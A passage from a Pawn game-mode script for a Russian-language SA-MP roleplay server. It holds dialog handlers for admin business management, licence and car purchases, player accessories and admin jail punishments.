			new Cache:result = mysql_query(dbHandle, STRING_GLOBAL);

			if(cache_num_rows())
			{
				new fname[MAX_PLAYER_NAME], data[20], reason[64];
				cache_get_field_content(0, "fname", fname, MAX_PLAYER_NAME);
				cache_get_field_content(0, "date", data, 20);
				cache_get_field_content(0, "reason", reason, 64);

				static gText[] =
				{
					"{FFFFFF}Nick-name игрока:{FF8C00}\t%s\n"\
					"{FFFFFF}Дата занесения:{FF8C00}\t%s\n"\
					"{FFFFFF}Nick-name автора:{FF8C00}\t%s\n"\
					"{FFFFFF}Причина занесения:{FF8C00}\t%s\n"
				};

				STRING_GLOBAL[0] = '\0';
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, gText, inputtext, data, fname, reason);
				ShowPlayerDialog(playerid, D_NULL, DIALOG_STYLE_MSGBOX, "Результат проверки", STRING_GLOBAL, "Хорошо", "");
			}
			else ShowPlayerDialog(playerid, D_NULL, DIALOG_STYLE_MSGBOX, "Результат проверки", "{FF8C00}Пользователя нет в черном списке фракций.", "Хорошо", "");

			cache_delete(result);
		}
		case DIALOG_STO_CHANGE_COLOR:
		{
			if(response)
			{
				if(!strlen(inputtext) || strlen(inputtext) != 1)
					return ShowPlayerDialog
					(
						playerid, DIALOG_STO_CHANGE_COLOR, DIALOG_STYLE_INPUT,
						"{FFCC00}Смена цвета",
						"{FFFFFF}Введите номер цвета:",
						"Далее", "Отмена"
					);

				new type = GetPVarInt(playerid, "color_type");

				PI[playerid][P_COLOR][type-1] = strval(inputtext);

				ChangeVehicleColor(GetPlayerVehicleID(playerid), PI[playerid][P_COLOR][0], PI[playerid][P_COLOR][1]);

				new biz_id = GetPVarInt(playerid, "CTObizzid"),
				price = BizzInfo[biz_id][bTill]*5;

				STRING_GLOBAL[0] = EOS;
				format
				(
					STRING_GLOBAL, sizeof STRING_GLOBAL,
					"основной_цвет:_%d~n~доп.цвет:_%d~n~К_ОПЛАТЕ:_%d_руб.", PI[playerid][P_COLOR][0], PI[playerid][P_COLOR][1], price
				);
				PlayerTextDrawSetString(playerid, sto_td_player[2][playerid], STRING_GLOBAL);
			}
		}
		case DLG_ADM_BIZZ_MENU: // управление бизнесом админом
		{
			if(!response) return 1;

			SetPVarInt(playerid, "abizzinfoid", listitem+1);
			ShowAdminBizzPanel(playerid);
		}
		case DLG_ADM_BIZZ_MENU_1:
		{
			if(!response) return callcmd::abizzinfo(playerid);

			new bizzid = GetPVarInt(playerid, "abizzinfoid");
			switch(listitem)
			{
				case 0: BizzStats(playerid, bizzid);
				case 1: // открыть бизнес
				{
					if(BizzInfo[bizzid][bLock] == 0) return SendClientMessage(playerid, COLOR_GREY, "Бизнес уже открыт!");
				//	if(BizzInfo[bizzid][bProduct] <= 0 || BizzInfo[bizzid][bLic] == 0) return SendClientMessage(playerid, COLOR_GREY, "В бизнесе нет продуктов или нет лицензии!");
					BizzInfo[bizzid][bLock] = 0;
					BizzInfo[bizzid][bLockTime] = 0;
					MysqlUpdateBizzInt(bizzid, "block", BizzInfo[bizzid][bLock]);
					MysqlUpdateBizzInt(bizzid, "locktime", BizzInfo[bizzid][bLockTime]);
					SendClientMessage(playerid, COLOR_LIGHTRED, "Вы открыли бизнес выбранный бизнес.");
					ShowAdminBizzPanel(playerid);
				}
				case 2: // установить цену за товар
				{
					switch(BizzInfo[bizzid][bType])
					{
						case 1, 6, 7, 8, 9:
						{
							SendClientMessage(playerid, COLOR_GREY, "В данном типе бизнеса нельзя управлять ценой на товар!");
						}
						default:
						{
							ShowPlayerDialog(playerid, DLG_ADM_BIZZ_MENU_2, 1, "Цена", "{ffffff}Введите цену за товар:", "Принять", "Отмена");
						}
					}
				}
				case 3: // установить цену за вход
				{
				    if(BizzInfo[bizzid][bType] == 2 || BizzInfo[bizzid][bType] == 7)
				    {
				        SendClientMessage(playerid, COLOR_GREY, "В данном типе бизнеса нельзя управлять ценой за вход!");
				    }
				    else
				    {
				        ShowPlayerDialog(playerid, DLG_ADM_BIZZ_MENU_3, 1, "Цена", "{ffffff}Введите цену за вход:", "Принять", "Отмена");
				    }
				}
				case 4: // продать бизнес
				{
					ShowPlayerDialog(playerid, DLG_ADM_BIZZ_MENU_4, 0, "Продать бизнес", "{ffffff}Вы хотите продать бизнес у данного игрока?", "Да", "Нет");
				}
				case 5: // изменить количество продуктов
				{
					ShowPlayerDialog(playerid, DLG_ADM_BIZZ_MENU_5, DIALOG_STYLE_INPUT, "Изменение количества продуктов", "{ffffff}Введите количество продуктов, которое хотите установить бизнесу", "Готово", "Отмена");
				}
				case 6: // телепорт к бизнесу
				{
					SetPlayerPos(playerid, BizzInfo[bizzid][bEntrx], BizzInfo[bizzid][bEntry], BizzInfo[bizzid][bEntrz]);
					SendClientMessage(playerid, -1, "Вы успешно телепортировались к бизнесу.");
				}
			}
		}
		case DLG_ADM_BIZZ_MENU_2: // цена за товар
		{
			if(!response) return 1;

			new price, i = GetPVarInt(playerid, "abizzinfoid");
			if(sscanf(inputtext, "i", price)) return ShowPlayerDialog(playerid, DLG_ADM_BIZZ_MENU_2, 1, "Цена", "{ffffff}Введите цену за товар:", "Принять", "Отмена");
			if(BizzInfo[i][bType] == 2)
			{
				if(price < 50 || price > 200) return SendClientMessage(playerid, COLOR_GREY, "Неверная цена. Возможно от 50 до 200р");
			}
			else
			{
			    if(price < 1 || price > 500) return SendClientMessage(playerid, COLOR_GREY, "Неверная цена. Возможно от 1 до 500р");
			}
			BizzInfo[i][bTill] = price;
			MysqlUpdateBizzInt(i, "till", price);
			SendClientMessage(playerid, COLOR_BLUE, "Новая цена товара установлена");
			UpdateBizz(i);
			ShowAdminBizzPanel(playerid);
		}
		case DLG_ADM_BIZZ_MENU_3:
		{
			if(!response) return 1;
			new price, i = GetPVarInt(playerid, "abizzinfoid");
			if(sscanf(inputtext, "i", price)) return ShowPlayerDialog(playerid, DLG_ADM_BIZZ_MENU_3, 1, "Цена", "{ffffff}Введите цену за вход:", "Принять", "Отмена");

			if(BizzInfo[i][bType] == 9)
			{
				if(price < 1000 || price > 10000) return SendClientMessage(playerid, COLOR_GREY, "Неверная цена. Возможно от 1000 до 10000р");
			}
			else
			{
				if(price < 0 || price > 5000) return SendClientMessage(playerid, COLOR_GREY, "Неверная цена. Возможно от 0 до 5000р");
			}
			BizzInfo[i][bEnter] = price;
			MysqlUpdateBizzInt(i, "penter", price);
			SendClientMessage(playerid, COLOR_BLUE, "Цена за вход успешно установлена");
			UpdateBizz(i);
			ShowAdminBizzPanel(playerid);
		}
		case DLG_ADM_BIZZ_MENU_4:
		{
			if(!response) return 1;
			new i = GetPVarInt(playerid, "abizzinfoid");
			strmid(BizzInfo[i][bOwner], "None", 0, MAX_PLAYER_NAME, MAX_PLAYER_NAME);
			BizzInfo[i][bLock] = BizzInfo[i][bBuyPrice] = BizzInfo[i][bMoney] = BizzInfo[i][bEnter] = BizzInfo[i][bControl] = 0;
			BizzInfo[i][bTill] = 50;
			switch(BizzInfo[i][bType])
			{
			    case 1: BizzInfo[i][bProduct] = 5000;
			    case 2: BizzInfo[i][bProduct] = 20000;
			    case 3: BizzInfo[i][bProduct] = 3000;
			    case 4: BizzInfo[i][bProduct] = 7000;
			    case 5: BizzInfo[i][bProduct] = 7000;
			    case 6: BizzInfo[i][bProduct] = 20000;
			    case 7: BizzInfo[i][bProduct] = 100000;
			    case 8: BizzInfo[i][bProduct] = 50000;
			    case 9: BizzInfo[i][bProduct] = 50000;
			}
			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_BIZZ" SET owner='%s', block=%d, money=%d, penter=%d, till=%d, buyprice=%d , product=%d WHERE id = %d",
			BizzInfo[i][bOwner], BizzInfo[i][bLock], BizzInfo[i][bMoney], BizzInfo[i][bEnter], BizzInfo[i][bTill], BizzInfo[i][bBuyPrice], BizzInfo[i][bProduct],i);
			mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
			UpdateBizz(i);
			SendClientMessage(playerid, -1, "Вы успешно продали бизнес данного игрока");
			ShowAdminBizzPanel(playerid);
		}
		case DLG_ADM_BIZZ_MENU_5:
		{
			if(!response) return 1;

			new product = strval(inputtext);
			if(product < 0 || product >= 1000000) return ShowPlayerDialog(playerid, DLG_ADM_BIZZ_MENU_5, DIALOG_STYLE_INPUT, "Изменение количества продуктов", "{ffffff}Введите количество продуктов, которое хотите установить бизнесу", "Готово", "Отмена");

			new i = GetPVarInt(playerid, "abizzinfoid");
			BizzInfo[i][bProduct] = product;
			MysqlUpdateBizzInt(i, "product", product);
			SendClientMessage(playerid, -1, "Количество продуктов в выбранном бизнесе успешно изменено");
			ShowAdminBizzPanel(playerid);
		}
		case D_BUY_LICENSES:
		{
			if(!response)
				return 1;

			if(g_player_skills[playerid][S_LICS][listitem] == 1)
				return SendClientMessage(playerid, -1, !"У Вас уже есть данная категория лицензий.");

			static const gLicensePrice[] =
			{
				5000, // наземный
				10000, // водный
				15000, // воздушный
				25000, // оружие
				100000 // бизнес
			};

			new price = gLicensePrice[listitem];
			if(GetMoney(playerid) < price)
				return SendMess(playerid, MSG_NOT_MONEY);

			GivePlayerMoney(playerid, -price);

			g_player_skills[playerid][S_LICS][listitem] = 1;
			SavePlayerSkills(playerid);

			SendClientMessage(playerid, -1, !"Вы успешно приобрели данную лицензию.");
			return 1;
		}
		case D_AUTOSALON:
		{
			if(!response)
				return 1;

			new vehicleid = GetPlayerVehicleID(playerid);
			if(vehicleid == 0)
				return 1;

			if(GetMoney(playerid) < g_vehicle[vehicleid][veh_price])
			{
				SendMess(playerid, MSG_NOT_MONEY);
				RemovePlayerFromVehicle(playerid);
				return 1;
			}

			new Cache:result, slot[5], var = -1, i;
			STRING_GLOBAL[0] = '\0';
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT slot FROM ownable_cars WHERE owner_name = '%s' LIMIT 5", PI[playerid][pName]);
			result = mysql_query(dbHandle, STRING_GLOBAL);

			if(!result)
				var = 1;

			for(i = 0; i < 5; i++)
			{
				slot[i] = cache_get_field_content_int(i, "slot", dbHandle);
				if(slot[i] != 0)
					continue;
				var = slot[i];
				break;
			}
			if(var == -1)
			{
				SendClientMessage(playerid, -1, !"У вас нет свободных слотов для приобретения данного транспорта");
				RemovePlayerFromVehicle(playerid);
				return 1;
			}

			if(i > 0 && PI[playerid][pVip] <= 0)
			{
				SendClientMessage(playerid,COLOR_ORANGE,!"Покупать вторую машину доступно только VIP игрокам");
				RemovePlayerFromVehicle(playerid);
				return 1;
			}
			if(0 < i < 2 && PI[playerid][pDonateCar] == 0)
			{
				SendClientMessage(playerid,COLOR_ORANGE,"У Вас нет привелегии покупки третьего авто, приобрести: /donate");
				RemovePlayerFromVehicle(playerid);
				return 1;
			}

			GiveMoney(playerid, -g_vehicle[vehicleid][veh_price]);

			SendClientMessage(playerid, COLOR_ORANGE, "Поздравляем с приобретением автомобиля!");

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Автомобиль помещен в слот #%d, пожалуйста, не забудьте припарковать его (/park)", var + 1);
			SendClientMessage(playerid, COLOR_ORANGE, STRING_GLOBAL);

			new r = random(sizeof SalonRandSpawn);

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "INSERT INTO ownable_cars (owner_name, model, color_1, color_2, slot, pos_x, pos_y, pos_z, pos_r) VALUES ('%s', '%d', '%d', '%d', '%d', '%f', '%f', '%f', '%f')", GetName(playerid), g_vehicle[vehicleid][veh_model], g_vehicle[vehicleid][veh_color][0], g_vehicle[vehicleid][veh_color][1], var + 1, SalonRandSpawn[r][0], SalonRandSpawn[r][1], SalonRandSpawn[r][2], SalonRandSpawn[r][3]);
			mysql_tquery(dbHandle, STRING_GLOBAL);

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "DELETE FROM autosalon WHERE id = %d", g_vehicle[vehicleid][veh_sql_id]);
			mysql_tquery(dbHandle, STRING_GLOBAL);

			STRING_GLOBAL[0] = '\0';
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT id FROM ownable_cars WHERE owner_name = '%s' AND slot = %d", GetName(playerid), var+1);
			new Cache:result1 = mysql_query(dbHandle, STRING_GLOBAL);

			if(result1)
			{
				LoadPlayerOwnableCar(playerid, cache_get_field_content_int(0, "id", dbHandle));
			}

			DestroyVehicle(vehicleid);
			ClearVehicleData(vehicleid);
			return 1;
		}
		case 8420:
		{
			if(response)
			{
				switch(listitem)
				{
					case 0:
					{
					   if(IsPlayerAttachedObjectSlotUsed(objectplayerid, 2)) RemovePlayerAttachedObject(objectplayerid, 2);
					   SetPlayerAttachedObject(objectplayerid,2,19137,2,0.100000,0.000000,0.000000,0.000000,0.000000,0.000000,1.000000,1.000000,1.000000);
					   return 1;
					}
					case 1:
					{
						if(IsPlayerAttachedObjectSlotUsed(objectplayerid, 5)) RemovePlayerAttachedObject(objectplayerid, 5);
						SetPlayerAttachedObject(objectplayerid,5, 19270, 2, 0.111052, 0.021643, -0.000846, 92.280899, 92.752510, 358.071044, 1.200000, 1.283168, 1.200000);
						return 1;
					}
					case 2:
					{
						if(IsPlayerAttachedObjectSlotUsed(objectplayerid, 4)) RemovePlayerAttachedObject(objectplayerid, 4);
						SetPlayerAttachedObject(objectplayerid,4, 18646, 2, 0.111052, 0.021643, -0.000846, 92.280899, 92.752510, 358.071044, 1.200000, 1.283168, 1.200000);
						return 1;
					}
					case 3:
					{
						if(IsPlayerAttachedObjectSlotUsed(objectplayerid, 5)) RemovePlayerAttachedObject(objectplayerid, 5);
						SetPlayerAttachedObject(objectplayerid,5, 19163, 2, 0.111052, 0.021643, -0.000846, 100.280899, 100.752510, 445.071044, 1.100000, 1.300000, 1.300000);
						return 1;
					}
					case 4:
					{
						if(IsPlayerAttachedObjectSlotUsed(objectplayerid, 0)) RemovePlayerAttachedObject(objectplayerid, 0);
						SetPlayerAttachedObject(objectplayerid,0, 18915, 2, 0.1, 0.03, -0.005, 90.0, 180.0, 90.0);
						return 1;
					}
					case 5:
					{
						if(IsPlayerAttachedObjectSlotUsed(objectplayerid, 0)) RemovePlayerAttachedObject(objectplayerid, 0);
						SetPlayerAttachedObject(objectplayerid,0, 18912, 2, 0.1, 0.03, -0.005, 90.0, 180.0, 90.0);
						return 1;
					}
					case 6:
					{
						if(IsPlayerAttachedObjectSlotUsed(objectplayerid, 0)) RemovePlayerAttachedObject(objectplayerid, 0);
						SetPlayerAttachedObject(objectplayerid,0, 18916, 2, 0.1, 0.03, -0.005, 90.0, 180.0, 90.0);
						return 1;
					}
					case 7:
					{
						if(IsPlayerAttachedObjectSlotUsed(objectplayerid, 0)) RemovePlayerAttachedObject(objectplayerid, 0);
						SetPlayerAttachedObject(objectplayerid,0, 18917, 2, 0.1, 0.03, -0.005, 90.0, 180.0, 90.0);
						return 1;
					}
					case 8:
					{
						if(IsPlayerAttachedObjectSlotUsed(objectplayerid, 0)) RemovePlayerAttachedObject(objectplayerid, 0);
						SetPlayerAttachedObject(objectplayerid,0, 18918, 2, 0.1, 0.03, -0.005, 90.0, 180.0, 90.0);
						return 1;
					}
					case 9:
					{
						if(IsPlayerAttachedObjectSlotUsed(objectplayerid, 4)) RemovePlayerAttachedObject(objectplayerid, 4);
						SetPlayerAttachedObject(objectplayerid,4, 3528, 2, 0.111052, 0.021643, -0.000846, 92.280899, 92.752510, 358.071044, 0.100000, 0.100000, 0.100000);
						return 1;
					}
					case 10:
					{
						if(IsPlayerAttachedObjectSlotUsed(objectplayerid, 4)) RemovePlayerAttachedObject(objectplayerid, 4);
						SetPlayerAttachedObject(objectplayerid,4, 18643, 2, 0.111052, 0.021643, -0.000846, 92.280899, 92.752510, 358.071044, 1.200000, 1.283168, 1.200000);
						return 1;
					}
					case 11:
					{
						if(IsPlayerAttachedObjectSlotUsed(objectplayerid, 0) || IsPlayerAttachedObjectSlotUsed(objectplayerid, 1) || IsPlayerAttachedObjectSlotUsed(objectplayerid, 4))
						{
							RemovePlayerAttachedObject(objectplayerid, 0);
							RemovePlayerAttachedObject(objectplayerid, 1);
							RemovePlayerAttachedObject(objectplayerid, 4);
						}
						SetPlayerAttachedObject(objectplayerid,0, 18693, 5, 1.983503, 1.558882, -0.129482, 86.705787, 308.978118, 268.198822, 1.500000, 1.500000, 1.500000);
						SetPlayerAttachedObject(objectplayerid,1, 18693, 6, 1.983503, 1.558882, -0.129482, 86.705787, 308.978118, 268.198822, 1.500000, 1.500000, 1.500000);
						SetPlayerAttachedObject(objectplayerid,4, 18965, 2, 0.111052, 0.021643, -0.000846, 92.280899, 92.752510, 358.071044, 1.200000, 1.283168, 1.200000);
						return 1;
					}
					case 12:
					{
						if(IsPlayerAttachedObjectSlotUsed(objectplayerid, 5)) RemovePlayerAttachedObject(objectplayerid, 5);
						SetPlayerAttachedObject(objectplayerid,5, 19078, 1, 0.329150, -0.072101, 0.156082, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000);

						return 1;
					}
					case 13:
					{
						if(IsPlayerAttachedObjectSlotUsed(objectplayerid, 5)) RemovePlayerAttachedObject(objectplayerid, 5);
						SetPlayerAttachedObject(objectplayerid,5, 354, 1, 0.329150, -0.072101, 0.156082, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000);
						return 1;
					}
					case 14:
					{
						if(IsPlayerAttachedObjectSlotUsed(objectplayerid, 1)) RemovePlayerAttachedObject(objectplayerid, 1);
						SetPlayerAttachedObject(objectplayerid,1, 356, 6, 0.013610, -0.021393, -0.144862, 2.354303, 354.413848, 0.219168, 3.034477, 3.000000, 3.000000);
						return 1;
					}
					case 15:
					{

						if(IsPlayerAttachedObjectSlotUsed(objectplayerid, 1)) RemovePlayerAttachedObject(objectplayerid, 1);
						SetPlayerAttachedObject(objectplayerid,1, 19086, 8, -0.049768, -0.014062, -0.108385, 87.458297, 263.478149, 184.123764, 0.622413, 1.041609, 1.012785);

						return 1;
					}
					case 16:
					{
						if(IsPlayerAttachedObjectSlotUsed(objectplayerid, 0)) RemovePlayerAttachedObject(objectplayerid, 0);
						SetPlayerAttachedObject(objectplayerid,0, 19078, 1, -1.097527, -0.348305, -0.008029, 0.000000, 0.000000, 0.000000, 8.073966, 8.073966, 8.073966);
						return 1;
					}
					case 17:
					{
						RemovePlayerAttachedObject(objectplayerid, 0);
						RemovePlayerAttachedObject(objectplayerid, 1);
						RemovePlayerAttachedObject(objectplayerid, 2);
						RemovePlayerAttachedObject(objectplayerid, 3);
						RemovePlayerAttachedObject(objectplayerid, 4);
						RemovePlayerAttachedObject(objectplayerid, 5);
						RemovePlayerAttachedObject(objectplayerid, 6);
						RemovePlayerAttachedObject(objectplayerid, 7);
						RemovePlayerAttachedObject(objectplayerid, 8);
						RemovePlayerAttachedObject(objectplayerid, 9);
						return 1;
					}
				}
			}
		}

    case DEMORGAN:
	{
		if(!response) return true;
		new jailid = GetPVarInt(playerid, "demorgan"), jail_string[128];

		switch(listitem)
		{
			case 0:
			{
				PI[jailid][pJail] = 1;
				PI[jailid][pJailTime] = 10*60;
				SetPlayerInterior(jailid, 0);
				new idx = random(sizeof coord_spawn_demorgan);
				SetPlayerPos(jailid, coord_spawn_demorgan[idx][0], coord_spawn_demorgan[idx][1], coord_spawn_demorgan[idx][2]);
				SetPlayerFacingAngle(jailid, coord_spawn_demorgan[idx][3]);
				FreezePlayer(jailid, 2000);
				SetPlayerWantedLevel(jailid, 0);
				SetPlayerFacingAngle(jailid,0);
				SetCameraBehindPlayer(jailid);
 				format(jail_string, sizeof(jail_string), "Администратор %s посадил в деморган игрока %s. Причина: DM", GetName(playerid), GetName(jailid));
				SendClientMessageToAll(COLOR_RED, jail_string);
				format(jail_string, sizeof jail_string, "[A] %s[%d] заключил в тюрьму %s[%d] на 10 минут. Причина: DM", GetName(playerid), playerid, GetName(jailid), jailid);
				SendAdminMessage(0xA2A2A2FF, jail_string);
				SendClientMessage(jailid, -1, "Время до выхода на свободу: {cccc00}/time");
			}
			case 1:
			{
				PI[jailid][pJail] = 1;
				PI[jailid][pJailTime] = 10*60;
				SetPlayerInterior(jailid, 0);
				new idx = random(sizeof coord_spawn_demorgan);
				SetPlayerPos(jailid, coord_spawn_demorgan[idx][0], coord_spawn_demorgan[idx][1], coord_spawn_demorgan[idx][2]);
				SetPlayerFacingAngle(jailid, coord_spawn_demorgan[idx][3]);
				FreezePlayer(jailid, 2000);
				SetPlayerWantedLevel(jailid, 0);
				SetPlayerFacingAngle(jailid,0);
				SetCameraBehindPlayer(jailid);
				format(jail_string, sizeof(jail_string), "Администратор %s посадил в деморган игрока %s. Причина: DB", GetName(playerid), GetName(jailid));
				SendClientMessageToAll(COLOR_RED, jail_string);
				format(jail_string, sizeof jail_string, "[A] %s[%d] заключил в тюрьму %s[%d] на 10 минут. Причина: DB", GetName(playerid), playerid, GetName(jailid), jailid);
				SendAdminMessage(0xA2A2A2FF, jail_string);
				SendClientMessage(jailid, -1, "Время до выхода на свободу: {cccc00}/time");
			}
			case 2:
			{
				PI[jailid][pJail] = 1;
				PI[jailid][pJailTime] = 5*60;
				SetPlayerInterior(jailid, 0);
				new idx = random(sizeof coord_spawn_demorgan);
				SetPlayerPos(jailid, coord_spawn_demorgan[idx][0], coord_spawn_demorgan[idx][1], coord_spawn_demorgan[idx][2]);
				SetPlayerFacingAngle(jailid, coord_spawn_demorgan[idx][3]);
				FreezePlayer(jailid, 2000);
				SetPlayerWantedLevel(jailid, 0);
				SetPlayerFacingAngle(jailid,0);
				SetCameraBehindPlayer(jailid);
		    	format(jail_string, sizeof(jail_string), "Администратор %s посадил в деморган игрока %s. Причина: SK", GetName(playerid), GetName(jailid));
				SendClientMessageToAll(COLOR_RED, jail_string);
				format(jail_string, sizeof jail_string, "[A] %s[%d] заключил в тюрьму %s[%d] на 5 минут. Причина: SK", GetName(playerid), playerid, GetName(jailid), jailid);
				SendAdminMessage(0xA2A2A2FF, jail_string);
				SendClientMessage(jailid, -1, "Время до выхода на свободу: {cccc00}/time");
			}
			case 3:
			{
				PI[jailid][pJail] = 1;
				PI[jailid][pJailTime] = 5*60;
				SetPlayerInterior(jailid, 0);
				new idx = random(sizeof coord_spawn_demorgan);
				SetPlayerPos(jailid, coord_spawn_demorgan[idx][0], coord_spawn_demorgan[idx][1], coord_spawn_demorgan[idx][2]);
				SetPlayerFacingAngle(jailid, coord_spawn_demorgan[idx][3]);
				FreezePlayer(jailid, 2000);
				SetPlayerWantedLevel(jailid, 0);
				SetPlayerFacingAngle(jailid,0);
				SetCameraBehindPlayer(jailid);
 				format(jail_string, sizeof(jail_string), "Администратор %s посадил в деморган игрока %s. Причина: Срыв мероприятия", GetName(playerid), GetName(jailid));
				SendClientMessageToAll(COLOR_RED, jail_string);
				format(jail_string, sizeof jail_string, "[A] %s[%d] заключил в тюрьму %s[%d] на 5 минут. Причина: Срыв мероприятия", GetName(playerid), playerid, GetName(jailid), jailid);
				SendAdminMessage(0xA2A2A2FF, jail_string);
				SendClientMessage(jailid, -1, "Время до выхода на свободу: {cccc00}/time");
			}
			case 4:
			{
				PI[GetPVarInt(playerid,"demorgan")][pJail] = 1;
				PI[jailid][pJailTime] = 5*60;
				SetPlayerPos(jailid,-80.0286, 806.6516, -4.4737);
				SetPlayerInterior(jailid, 0);
				new idx = random(sizeof coord_spawn_demorgan);
				SetPlayerPos(jailid, coord_spawn_demorgan[idx][0], coord_spawn_demorgan[idx][1], coord_spawn_demorgan[idx][2]);
				SetPlayerFacingAngle(jailid, coord_spawn_demorgan[idx][3]);
				FreezePlayer(jailid, 2000);
				SetPlayerWantedLevel(jailid, 0);
				SetCameraBehindPlayer(jailid);
 				format(jail_string, sizeof(jail_string), "Администратор %s посадил в деморган игрока %s. Причина: Срыв набора", GetName(playerid), GetName(jailid));
				SendClientMessageToAll(COLOR_RED, jail_string);
				format(jail_string, sizeof jail_string, "[A] %s[%d] заключил в тюрьму %s[%d] на 5 минут. Причина: Срыв набора", GetName(playerid), playerid, GetName(jailid), jailid);
				SendAdminMessage(0xA2A2A2FF, jail_string);
				SendClientMessage(jailid, -1, "Время до выхода на свободу: {cccc00}/time");
			}
			case 5:
			{
				PI[jailid][pJail] = 1;
				PI[jailid][pJailTime] = 10*60;
				SetPlayerInterior(jailid, 0);
				new idx = random(sizeof coord_spawn_demorgan);
				SetPlayerPos(jailid, coord_spawn_demorgan[idx][0], coord_spawn_demorgan[idx][1], coord_spawn_demorgan[idx][2]);
				SetPlayerFacingAngle(jailid, coord_spawn_demorgan[idx][3]);
				FreezePlayer(jailid, 2000);
				SetPlayerWantedLevel(jailid, 0);
				SetCameraBehindPlayer(jailid);
 				format(jail_string, sizeof(jail_string), "Администратор %s посадил в деморган игрока %s. Причина: DM in ZZ", GetName(playerid), GetName(jailid));
				SendClientMessageToAll(COLOR_RED, jail_string);
				format(jail_string, sizeof jail_string, "[A] %s[%d] заключил в тюрьму %s[%d] на 10 минут. Причина: DM in ZZ", GetName(playerid), playerid, GetName(jailid), jailid);
				SendAdminMessage(0xA2A2A2FF, jail_string);
				SendClientMessage(jailid, -1, "Время до выхода на свободу: {cccc00}/time");
			}
			case 6:
			{
				PI[jailid][pJail] = 1;
				PI[jailid][pJailTime] = 5*60;
				SetPlayerInterior(jailid, 0);
				new idx = random(sizeof coord_spawn_demorgan);
				SetPlayerPos(jailid, coord_spawn_demorgan[idx][0], coord_spawn_demorgan[idx][1], coord_spawn_demorgan[idx][2]);
				SetPlayerFacingAngle(jailid, coord_spawn_demorgan[idx][3]);
				FreezePlayer(jailid, 2000);
				SetPlayerWantedLevel(jailid, 0);
				SetPlayerFacingAngle(jailid,0);
				SetCameraBehindPlayer(jailid);
				format(jail_string, sizeof(jail_string), "Администратор %s посадил в деморган игрока %s. Причина: PG", GetName(playerid), GetName(jailid));
				SendClientMessageToAll(COLOR_RED, jail_string);
				format(jail_string, sizeof jail_string, "[A] %s[%d] заключил в тюрьму %s[%d] на 5 минут. Причина: PG", GetName(playerid), playerid, GetName(jailid), jailid);
				SendAdminMessage(0xA2A2A2FF, jail_string);
				SendClientMessage(jailid, -1, "Время до выхода на свободу: {cccc00}/time");
			}
			case 7:
			{
				PI[jailid][pJail] = 1;
				PI[jailid][pJailTime] = 10*60;
				SetPlayerInterior(jailid, 0);
				new idx = random(sizeof coord_spawn_demorgan);
				SetPlayerPos(jailid, coord_spawn_demorgan[idx][0], coord_spawn_demorgan[idx][1], coord_spawn_demorgan[idx][2]);
				SetPlayerFacingAngle(jailid, coord_spawn_demorgan[idx][3]);
				FreezePlayer(jailid, 2000);
				SetPlayerWantedLevel(jailid, 0);
				SetPlayerFacingAngle(jailid,0);
				SetCameraBehindPlayer(jailid);
				format(jail_string, sizeof(jail_string), "Администратор %s посадил в деморган игрока %s. Причина: Багоюз", GetName(playerid), GetName(jailid));
				SendClientMessageToAll(COLOR_RED, jail_string);
				format(jail_string, sizeof jail_string, "[A] %s[%d] заключил в тюрьму %s[%d] на 10 минут. Причина: Багоюз", GetName(playerid), playerid, GetName(jailid), jailid);
				SendAdminMessage(0xA2A2A2FF, jail_string);
				SendClientMessage(jailid, -1, "Время до выхода на свободу: {cccc00}/time");
			}
			case 8:
			{
				PI[jailid][pJail] = 1;
				PI[jailid][pJailTime] = 10*60;
				SetPlayerInterior(jailid, 0);
				new idx = random(sizeof coord_spawn_demorgan);
				SetPlayerPos(jailid, coord_spawn_demorgan[idx][0], coord_spawn_demorgan[idx][1], coord_spawn_demorgan[idx][2]);
				SetPlayerFacingAngle(jailid, coord_spawn_demorgan[idx][3]);
				FreezePlayer(jailid, 2000);
				SetPlayerWantedLevel(jailid, 0);
				SetPlayerFacingAngle(jailid,0);
				SetCameraBehindPlayer(jailid);
				format(jail_string, sizeof(jail_string), "Администратор %s посадил в деморган игрока %s. Причина: DM в КПЗ", GetName(playerid), GetName(jailid));
				SendClientMessageToAll(COLOR_RED, jail_string);
				format(jail_string, sizeof jail_string, "[A] %s[%d] заключил в тюрьму %s[%d] на 10 минут. Причина: DM в КПЗ", GetName(playerid), playerid, GetName(jailid), jailid);
				SendAdminMessage(0xA2A2A2FF, jail_string);
				SendClientMessage(jailid, -1, "Время до выхода на свободу: {cccc00}/time");
			}
			case 9:
			{
				PI[jailid][pJail] = 1;
				PI[jailid][pJailTime] = 10*60;
				SetPlayerInterior(jailid, 0);
				new idx = random(sizeof coord_spawn_demorgan);
				SetPlayerPos(jailid, coord_spawn_demorgan[idx][0], coord_spawn_demorgan[idx][1], coord_spawn_demorgan[idx][2]);
				SetPlayerFacingAngle(jailid, coord_spawn_demorgan[idx][3]);
				FreezePlayer(jailid, 2000);
				SetPlayerWantedLevel(jailid, 0);
				SetPlayerFacingAngle(jailid,0);
				SetCameraBehindPlayer(jailid);
				format(jail_string, sizeof(jail_string), "Администратор %s посадил в деморган игрока %s. Причина: DM in ZZ", GetName(playerid), GetName(jailid));
				SendClientMessageToAll(COLOR_RED, jail_string);
				format(jail_string, sizeof jail_string, "[A] %s[%d] заключил в тюрьму %s[%d] на 10 минут. Причина: DM in ZZ", GetName(playerid), playerid, GetName(jailid), jailid);
				SendAdminMessage(0xA2A2A2FF, jail_string);
				SendClientMessage(jailid, -1, "Время до выхода на свободу: {cccc00}/time");
			}
			case 10:
			{
				PI[jailid][pJail] = 1;
				PI[jailid][pJailTime] = 5*60;
				SetPlayerInterior(jailid, 0);
				new idx = random(sizeof coord_spawn_demorgan);
				SetPlayerPos(jailid, coord_spawn_demorgan[idx][0], coord_spawn_demorgan[idx][1], coord_spawn_demorgan[idx][2]);
				SetPlayerFacingAngle(jailid, coord_spawn_demorgan[idx][3]);
				FreezePlayer(jailid, 2000);
